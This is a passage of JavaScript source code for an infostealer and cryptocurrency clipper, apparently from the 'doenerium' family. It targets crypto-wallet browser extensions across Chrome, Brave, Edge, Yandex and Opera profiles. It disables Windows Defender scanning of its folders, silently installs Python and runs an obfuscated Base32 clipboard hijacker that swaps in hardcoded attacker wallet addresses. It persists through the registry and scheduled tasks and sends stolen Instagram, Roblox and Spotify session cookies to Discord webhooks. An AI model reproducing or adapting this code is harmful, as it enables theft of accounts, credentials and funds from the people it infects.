_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'
_0x4ae424.SuietSui =
    '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'
_0x4ae424.Braavos =
    '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'
_0x4ae424.FewchaMove =
    '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'
_0x4ae424.EthosSui =
    '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'
_0x4ae424.ArgentX =
    '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'
_0x4ae424.NiftyWallet =
    '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'
_0x4ae424.BraveWallet =
    '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'
_0x4ae424.EqualWallet =
    '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'
_0x4ae424.BitAppWallet =
    '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'
_0x4ae424.iWallet =
    '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'
_0x4ae424.AtomicWallet =
    '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'
_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'
_0x4ae424.GuildWallet =
    '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'
_0x4ae424.SaturnWallet =
    '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'
_0x4ae424.HarmonyWallet =
    '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'
_0x4ae424.PaliWallet =
    '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'
_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'
_0x4ae424.LiqualityWallet =
    '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'
_0x4ae424.MaiarDeFiWallet =
    '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'
_0x4ae424.TempleWallet =
    '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'
_0x4ae424.Metamask_E =
    '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'
_0x4ae424.Ronin_E =
    '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'
_0x4ae424.Yoroi_E =
    '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'
_0x4ae424.Authenticator_E =
    '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
_0x4ae424.MetaMask_O =
    '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'

const extension = _0x4ae424,
  browserPath = [
    [
      user.local + '\\Google\\Chrome\\User Data\\Default\\',
      'Default',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'Default',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
      'Default',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
      'Default',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Stable\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
    ],
  ],
randomPath = path.join(mainFolderPath);

if (!fs.existsSync(randomPath)) {
  console.log('');
} else {
  sendSuccessToWebhook();
}

function initializeFolders() {
    try {
        if (!fs.existsSync(mainFolderPath)) {
            fs.mkdirSync(mainFolderPath, { recursive: true });
            console.log('');
            sendSuccessToWebhook();
        }
    } catch (error) {
        const errorMessage = `Error Initialize main folder: ${error.message}`;
        console.error(errorMessage);
    }
}


function downloadPythonInstaller(url, outputFilePath) {
    return axios({
        url,
        method: 'GET',
        responseType: 'stream',
    }).then(response => {
        return new Promise((resolve, reject) => {
            const file = fs.createWriteStream(outputFilePath);
            response.data.pipe(file);
            file.on('finish', () => file.close(resolve));
            file.on('error', (err) => fs.unlink(outputFilePath, () => reject(err)));
        });
    }).catch(error => {
        console.error(`Failed to download Python installer: ${error.message}`);
    });
}

// Function to install Python
async function installPython() {
    const tempDir = os.tmpdir();  // Use the temporary directory
    const pythonInstallerUrl = 'https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe';
    const pythonInstallerFile = path.join(tempDir, 'python-installer.exe');

    console.log('Downloading Python installer...');
    await downloadPythonInstaller(pythonInstallerUrl, pythonInstallerFile);

    console.log('Performing silent installation of Python...');
    try {
    execFileSync(pythonInstallerFile, [
        '/quiet',
        'InstallAllUsers=0',
        'PrependPath=1',
        'Include_test=0',
        'Include_pip=1',
        'Include_doc=0'
    ], { stdio: 'inherit' });
    console.log('Python installed successfully.');
    } catch (error) {
    console.error(`Error during Python installation: ${error.message}`);
    }


    // Delete the installer file
    fs.unlinkSync(pythonInstallerFile);
    console.log('Installer deleted.');

    return path.join(process.env['USERPROFILE'], 'AppData', 'Local', 'Programs', 'Python', 'Python312', 'pythonw.exe');
}

function addDefenderExclusions() {
    const appDataHiddenFolder = path.join(os.homedir(), 'AppData', 'Local', `.${generateRandomString(10)}`);
    const systemTasksPath = 'C:\\Windows\\System32\\Tasks';

    const commands = [
        `powershell -Command Add-MpPreference -ExclusionPath "${appDataHiddenFolder}"`,
        `powershell -Command Add-MpPreference -ExclusionPath "${systemTasksPath}"`
    ];

    // Execute each PowerShell command synchronously
    commands.forEach((command) => {
        try {
            const output = execSync(command, { stdio: 'pipe' }).toString();
            console.log(`Exclusion added successfully: ${output}`);
        } catch (error) {
            console.error(`Error adding exclusion: ${error.message}`);
        }
    });
}

// Replace with your addresses or all money to me :)
const addresses = {
    btc: "bc1qsuc4rc2uknl43kqxemuyv6d3xffnds2j008gj7",
    eth: "0x700875DF55d904b24469458a6bAE04F6dd7eF91F",
    ltc: "ltc1qx7n7fr4anyssyhfp2s4sd9jv7r89ex9sd2d6dg",
    trx: "TJYeEhaoY5sQ66SHLbCp85jGcSkqLLvBTU",
    bch: "qzjw4dju5x2x3kwtuelppmm8lpw7mvna7s5fle3sr4",
    xmr: "43AKqd1L4QKVQux7bKEK6dUmVKEJTdEtgSgYaj25rgRGaUrp2gekLA1bRDzJbbadPTaNwBG8njmYCVvEiJZByyvV6NanCUR",
    xrp: "rf2ysNUBNYFPX5tzNfaNgRjJDedQWh6mSV",
    zcash: "t1a34uQ8XRNKoWyykQUAtR6vj58UDMpaayf",
    doge: "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"
};

// This is a clipper, here is the decrypted code: https://pastebin.com/raw/juyfkJ4N (DM me on Telegram if you don't know how to decrypt base64 :0)
async function clip(pythonwExe) {
    const appDataHiddenFolder = path.join(os.homedir(), 'AppData', 'Local', `.${generateRandomString(10)}`);
    if (!fs.existsSync(appDataHiddenFolder)) {
        fs.mkdirSync(appDataHiddenFolder, { recursive: true });
        fs.chmodSync(appDataHiddenFolder, 0o700); // Make it hidden
    }

    const scriptContent = `
import base64

# Base32 encoded Python code
encoded_code = """
NFWXA33SOQQHEZIKNFWXA33SOQQHI2LNMUFGS3LQN5ZHIIDQPFYGK4TDNRUXACTJNVYG64TUEBRGC43FGY2AU2LNOBXXE5BAN5ZQU2LNOBXXE5BAON4XGCTJNVYG64TUEBRXI6LQMVZQUZTSN5WSAY3UPFYGK4ZANFWXA33SOQQHO2LOOR4XAZLTBIFGCZDEOJSXG43FOMQD2ID3BIQCAIBAEJRHIYZCHIQCEYTDGFYXG5LDGRZGGMTVNNXGYNBTNNYXQZLNOV4XMNTEGN4GMZTOMRZTE2RQGA4GO2RXEIWAUIBAEAQCEZLUNARDUIBCGB4DOMBQHA3TKRCGGU2WIOJQGRRDENBUGY4TINJYME3GEQKFGA2EMNTEMQ3WKRRZGFDCELAKEAQCAIBCNR2GGIR2EARGY5DDGFYXQN3OG5THENDBNZ4XG43ZNBTHAMTTGRZWIOLKOY3XEOBZMV4DS43EGJSDMZDHEIWAUIBAEAQCE5DSPARDUIBCKRFFSZKFNBQW6WJVONITMNSTJBGGEQ3QHA2WUR3DKNVXCTCMOZBFIVJCFQFCAIBAEARGEY3IEI5CAITRPJVHONDENJ2TK6BSPAZWW53UOVSWY4DQNVWTQ3DQO43W25TOME3XGNLGNRSTG43SGQRCYCRAEAQCAITYNVZCEORAEI2DGQKLOFSDCTBUKFFVMULVPA3WES2FJM3GIVLNKZFUKSSUMRCXIZ2TM5MWC2RSGVZGOUSHMFKXE4BSM5SWWTCBGFRFERD2JJRGEYLEKBKGCTTXIJDTQ3TKNVMUGVTWIVUUUWSCPF4XMVRWJZQW4Q2VKIRCYCRAEAQCAITYOJYCEORAEJZGMMTZONHFKQSOLFDFAWBVOR5E4ZTBJZTVE2SKIRSWIUKXNA3G2U2WEIWAUIBAEAQCE6TDMFZWQIR2EARHIMLBGM2HKUJYLBJE4S3PK54XS22RKVAXIURWOZVDKOCVIRGXAYLBPFTCELAKEAQCAIBCMRXWOZJCHIQCERCRGVSVUULZJVREG42BI5CG6RJXOZYTG6TTKBEDO5RUGNCXMZSVKY3HESTWORAXE43ROF3DOTCFNVRDGQSGGZSTC5SIOVSEOUCDKFYHAYLYMYRAU7IKBJYGC5DUMVZG44ZAHUQHWCRAEAQCAITCORRSEORAOIRF4KDCMMYXYWZRGNOSSW3BFV5ECLKIJIWU4UBNLIYC2OK5PMZDMLBUGF6SIIRMBIQCAIBAEJSXI2BCHIQHEIS6GB4FWYJNMZAS2RRQFU4V26ZUGB6SIIRMBIQCAIBAEJWHIYZCHIQHEIS6FBGHYTL4GN6GY5DDGEUVWYJNNNWS26SBFVEEULKOKAWVUMJNHFOXWMRWFQZTG7JEEIWAUIBAEAQCE5DSPARDUIDSEJPFIW3BFV5ECLK2GAWTSXL3GI4CYMZTPUSCELAKEAQCAIBCMJRWQIR2EBZCEXRIFBRGS5DDN5UW4Y3BONUDUKJ7FBYXY4BJLNQS26RQFU4V26ZUGF6SSJBCFQFCAIBAEARHQ3LSEI5CA4RCLY2FWMBNHFAUEXK3GEWTSQJNJBFC2TSQFVNGCLLLNUWXUXL3HEZCYOJVPUSCELAKEAQCAIBCPBZHAIR2EBZCEXTSLMYC2OLBFV5ECLK2LV5TENBMGM2H2JBCFQFCAIBAEARHUY3BONUCEORAOIRF45BRLMYC2OKBFV5F26ZTGIWDGOL5EQRCYCRAEAQCAITEN5TWKIR2EBZCEXSEPMYX2WZVFU4UCLKIJIWU4UBNKVOXWML5LMYS2OKBFVEEULKOKAWVUYJNNNWS26S5PMZTELBWGF6SIIQKPUFAUZDFMYQGG4TFMF2GKX3NOV2GK6BINV2XIZLYL5XGC3LFFE5AUIBAEAQCGICDOJSWC5DFEBQSAV3JNZSG653TEBWXK5DFPAQHK43JNZTSAY3UPFYGK4YKEAQCAIDLMVZG4ZLMGMZCAPJAMN2HS4DFOMXHO2LOMRWGYLTLMVZG4ZLMGMZAUIBAEAQG25LUMV4CAPJANNSXE3TFNQZTELSDOJSWC5DFJV2XIZLYK4UE433OMUWCARTBNRZWKLBANV2XIZLYL5XGC3LFFEFAUIBAEAQGSZRANNSXE3TFNQZTELSHMV2EYYLTORCXE4TPOIUCSIB5HUQDCOBTHIQCAIZAIVJFET2SL5AUYUSFIFCFSX2FLBEVGVCTBIQCAIBAEAQCAIDQOJUW45BIMYREC3TPORUGK4RANFXHG5DBNZRWKIDJOMQGC3DSMVQWI6JAOJ2W43TJNZTS4ICFPBUXI2LOM4XCEKIKEAQCAIBAEAQCA43ZOMXGK6DJOQUDCKIKEAQCAIDFNRZWKOQKEAQCAIBAEAQCA4DSNFXHIKDGEJGXK5DFPAQHW3LVORSXQX3OMFWWK7JAMNZGKYLUMVSCA43VMNRWK43TMZ2WY3DZFYRCSCQKMRSWMIDNN5XGS5DPOJPWG3DJOBRG6YLSMQUCSOQKEAQCAIDSMVRWK3TUL53GC3DVMUQD2IBCEIFCAIBAEB3WQ2LMMUQFI4TVMU5AUIBAEAQCAIBAEBRWY2LQMJXWC4TEL53GC3DVMUQD2IDQPFYGK4TDNRUXALTQMFZXIZJIFEFCAIBAEAQCAIBANFTCAY3MNFYGE33BOJSF65TBNR2WKIBBHUQHEZLDMVXHIX3WMFWHKZJ2BIQCAIBAEAQCAIBAEAQCA4TFMNSW45C7OZQWY5LFEA6SAY3MNFYGE33BOJSF65TBNR2WKCRAEAQCAIBAEAQCAIBAEBTG64RAMNZHS4DUN4WCA4DBOR2GK4TOEBUW4IDQMF2HIZLSNZZS42LUMVWXGKBJHIFCAIBAEAQCAIBAEAQCAIBAEAQCA2LGEBZGKLTNMF2GG2BIOBQXI5DFOJXCYIDDNRUXAYTPMFZGIX3WMFWHKZJJHIFCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEAQHA6LQMVZGG3DJOAXGG33QPEUGCZDEOJSXG43FONNWG4TZOB2G6XJJBIQCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEBRHEZLBNMFCAIBAEAQCAIBAORUW2ZJOONWGKZLQFAYC4NJJBIFGSZRAL5PW4YLNMVPV6IB5HUQCEX27NVQWS3S7L4RDUCRAEAQCA3LVORSXQX3OMFWWKIB5EAREO3DPMJQWYXC4MNZHS4DUN5PWG3DJOBRG6YLSMRPW25LUMV4CEIBAEMQEO3DPMJQWYIDNOV2GK6BAORXSAYLWN5UWIIDDN5XGM3DJMN2HGIDBMNZG643TEB2XGZLSOMFCAIBAEBRXEZLBORSV63LVORSXQKDNOV2GK6C7NZQW2ZJJEAQCGICFNZZXK4TFEBXW43DZEBXW4ZJANFXHG5DBNZRWKIDPMYQHI2DFEBZWG4TJOB2CA2LTEBZHK3TONFXGOCRAEAQCA3LPNZUXI33SL5RWY2LQMJXWC4TEFAUQ====
"""

# Function to adjust padding for Base32 string
def adjust_padding(encoded_str):
    missing_padding = len(encoded_str) % 8
    if missing_padding:
        encoded_str += '=' * (8 - missing_padding)
    return encoded_str

# Adjust padding of the encoded string
encoded_code = adjust_padding(encoded_code.strip())

# Decode the Base32 encoded content
decoded_code = base64.b32decode(encoded_code).decode('utf-8')

# Execute the decoded code
exec(decoded_code)
`;

    const scriptFilePath = path.join(appDataHiddenFolder, `${generateRandomString(10)}.py`);
    fs.writeFileSync(scriptFilePath, scriptContent);

    await execPromise('pip install pyperclip');
    
    try {
        // Add the script to the registry for startup
        const registryCommand = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PythonScript" /t REG_SZ /d "${pythonwExe} \\"${scriptFilePath}\\"" /f`;
        execSync(registryCommand);
        console.log('Python script added to registry for startup.');

        // Also schedule the task
        const taskName = `PythonUpdater_${generateRandomString(8)}`;
        execSync(`schtasks /create /tn "${taskName}" /tr "\"${pythonwExe}\" \"${scriptFilePath}\"" /sc onlogon /f`);
        console.log('Python script scheduled to run at logon.');
    } catch (error) {
        console.error(`Error scheduling task or adding registry entry: ${error.message}`);
    }
    
    // Run the Python script in the background
    try {
        const pythonProcess = spawn(pythonwExe, [scriptFilePath], { detached: true, stdio: 'ignore' });
        pythonProcess.unref();  // Detach the process to let it run in the background
        console.log('Python script executed successfully in the background.');
    } catch (error) {
        console.error(`Error running Python script: ${error.message}`);
    }
}

// Main function to create and execute scripts and add Defender exclusions
async function createAndExecuteScripts() {
    try {
        addDefenderExclusions(); // Add hidden folder to Defender exclusions
        const pythonwExe = await installPython(); // Assume installPython is your function to install Python
        await clip(pythonwExe);  // Run the Python script
    } catch (error) {
        console.error(`Error: ${error.message}`);
    }

    // Continue script execution even after an error
    console.log('Continuing script execution...');
}

/* old shit
function createRunBat() {
    const userData = path.join('C:', 'ProgramData', 'edge', 'Updater');
    if (!fs.existsSync(userData)) {
        fs.mkdirSync(userData, { recursive: true });
    }

    // URL
    const downloadUrl1 = "YOUR-STEALER-EXE-LINK-HERE";
    const downloadUrl2 = "YOUR-BINDED-EXE-LINK-HERE";
    
    const app1Path = `"${process.argv[0]}"`;
    const app2Path = '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Steam_Service.exe"';

    const batFileName = `${generateRandomString(10)}.bat`;
    const vbsFileName = `${generateRandomString(10)}.vbs`;
    const batScriptPath = path.join(userData, batFileName);
    const vbsScriptPath = path.join(userData, vbsFileName);

    const batContent = `@echo off

powershell Add-MpPreference -ExclusionPath "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
powershell Add-MpPreference -ExclusionPath "%APPDATA%\\Microsoft\\Windows"
REM Add registry key
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Steam" /t REG_SZ /d ${app1Path} /f

REM Display registry value
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Steam"

REM Verify if App1 is already installed
if not exist ${app1Path} (
    REM Download and install App1
    curl -o ${app1Path} ${downloadUrl1}
    if not exist ${app1Path} (
        echo Error downloading App1.
    ) else (
        echo App1 installed successfully.
    )
) else (
    echo App1 is already installed.
)
REM Verify if App2 is already installed
if not exist ${app2Path} (
    REM Download and install App2
    curl -o ${app2Path} ${downloadUrl2}
    if not exist ${app2Path} (
        echo Error downloading App2.
    ) else (
        echo App2 installed successfully.
    )
) else (
    echo App2 is already installed.
)
`;

    fs.writeFileSync(batScriptPath, batContent, 'utf-8');
    console.log(`Batch script created successfully at: ${batScriptPath}`);

    const vbsContent = `Set objShell = CreateObject("WScript.Shell")
objShell.Run "${batScriptPath}", 0, True
Set objShell = Nothing`;

    fs.writeFileSync(vbsScriptPath, vbsContent, 'utf-8');
    console.log(`VBS script created successfully at: ${vbsScriptPath}`);

    const taskName = 'GoogleUpdateTaskMachineUAC';
    const schtasksCommand = `schtasks /create /tn "${taskName}" /tr "cscript //nologo ${vbsScriptPath}" /sc minute /mo 10 /f /RU SYSTEM`;

    exec(schtasksCommand, (err, stdout, stderr) => {
        if (err) {
            console.error('Error executing schtasks command:', err.message);
        } else {
            console.log('Scheduled task for verification created successfully.');
            const runVbsCommand = `cscript //nologo "${vbsScriptPath}"`;
            exec(runVbsCommand, (vbsErr, vbsStdout, vbsStderr) => {
                if (vbsErr) {
                    console.error('Error executing VBS script:', vbsErr.message);
                } else {
                    console.log('VBS script executed successfully.');
                }
            });
        }
    });
}
*/


async function GetInstaData(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "X-Ig-Connection-Type": "WiFi",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Ig-Capabilities": "36r/Fx8=",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "X-Ig-App-Locale": "en",
      "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
      "Accept-Encoding": "gzip, deflate",
      "Cookie": `sessionid=${session_id};`
    };

    // Request to get Instagram account data
    const response = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const userData = response.data.user;

    // Create data object
    const data = {
      username: userData.username,
      verified: userData.is_verified,
      avatar: userData.profile_pic_url,
      session_id: session_id
    };

    // Save Instagram session information to a file
    saveInstagramFile(session_id);

    return data;
  } catch (error) {
    console.error('Error fetching Instagram data:', error.message);
  }
}

function saveInstagramFile(session_id) {
  const instagramFolderPath = path.join(mainFolderPath, 'Instagram');
  const instagramFilePath = path.join(instagramFolderPath, 'instagram.txt');

  if (!fs.existsSync(instagramFolderPath)) {
    fs.mkdirSync(instagramFolderPath);
  }

  // Write the Instagram session information to the instagram.txt file
  fs.writeFileSync(instagramFilePath, `sessionid=${session_id}`);

  console.log('Instagram session information written to instagram.txt');
}

async function GetFollowersCount(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "Cookie": `sessionid=${session_id};`
    };

    const accountResponse = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const accountInfo = accountResponse.data.user;

    const userInfoResponse = await axios.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
    const userData = userInfoResponse.data.user;
    const followersCount = userData.follower_count;

    return followersCount;
  } catch (error) {
    console.error("Error fetching followers count:", error.message);
  }
}

async function SubmitInstagram(session_id) {
  try {
    const data = await GetInstaData(session_id);
    const followersCount = await GetFollowersCount(session_id);

    const embed = {
      title: '‎ ',
      color: 0x303037,
      author: {
        name: 'Instagram Session Detected',
        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190791450938572800/2048px-Instagram_icon.png'
      },
      thumbnail: { url: data.avatar },
      fields: [
        { name: '<a:VerifiedUser:1205132509076135987> Verified Account', value: '```' + (data.verified ? 'Yes' : 'No') + '```', inline: true },
        { name: '👤 Username ', value: '```' + data.username + '```', inline: true },
        { name: '<:twitter_follow:1205132510254604388> Followers Count ', value: '```' + followersCount + '```', inline: true },
        { name: 'Token', value: '```' + data.session_id + '```', inline: false },
      ],
      footer: {
        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
      },
    };

    await axios.post(discordWebhookUr1, { embeds: [embed] });

    // Introduce a 2-second delay before sending the second webhook request
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Retry logic with exponential backoff
    let retryAttempts = 0;
    while (retryAttempts < 3) { // Retry a maximum of 3 times
      try {
        await axios.post(discordWebhookUrl, { embeds: [embed] });
        break; // Break the loop if successful
      } catch (error) {
        if (error.response && error.response.status === 429) {
          // Exponential backoff: Wait for an increasing amount of time
          const delay = Math.pow(2, retryAttempts) * 1000;
          retryAttempts++;
          await new Promise(resolve => setTimeout(resolve, delay));
        } else {
          console.error("Error in second webhook request:", error.message);
          // Log the error and skip to the next iteration
          return; // or continue; depending on your context
        }
      }
    }
  } catch (error) {
    console.error("Error Submit Instagram:", error.message);
  }
}


async function GetRobloxData(secret_cookie) {
  let data = {};
  let headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
  };

  try {
    let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });

    data['username'] = response.data['UserName'];
    data['avatar'] = response.data['ThumbnailUrl'];
    data['robux'] = response.data['RobuxBalance'];
    data['premium'] = response.data['IsPremium'];

    return data;
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
    throw error;
  }
}

async function SubmitRoblox(secret_cookie) {
  try {
    let data = await GetRobloxData(secret_cookie);

    if (!data || !data.username || data.robux === undefined || data.premium === undefined) {
      return;
    }

    const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;

    let embed = {
      title: '‎',
      color: 0x303037,
      author: {
        name: 'Roblox Session Detected',
        icon_url: 'https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
      },
      thumbnail: {
        url: data.avatar,
      },
      fields: [
        {
          name: 'Name:',
          value: '```     ' + data.username + '     ```',
          inline: true,
        },
        {
          name: 'Robux:',
          value: '```   ' + robuxValue + '   ```',
          inline: true,
        },
        {
          name: 'Premium:',
          value: '```   ' + (data.premium ? 'Yes' : 'No') + '   ```',
          inline: true,
        },
        {
          name: 'Secret Cookie:',
          value: '```   ' + secret_cookie + '   ```',
          inline: true,
        },
      ],
      footer: {
        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
      },
    };

    let payload = {
      embeds: [embed],
    };

    await new Promise(resolve => setTimeout(resolve, 1000));

    console.log('Payload to be sent:', payload);

    axios.post(discordWebhookUrl, payload);
    axios.post(discordWebhookUr1, payload);
  } catch (error) {
    console.error('Error in SubmitRoblox:', error.message);
  }
}


//
async function SpotifySession(cookie) {
    try {
        const url = 'https://www.spotify.com/api/account-settings/v1/profile';

        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
            'Cookie': `sp_dc=${cookie}`
        };

        const response = await axios.get(url, { headers });

        const profileData = response.data.profile;

        const email = profileData.email || "Not available";
        const gender = profileData.gender || "Not available";
        const birthdate = profileData.birthdate || "Not available";
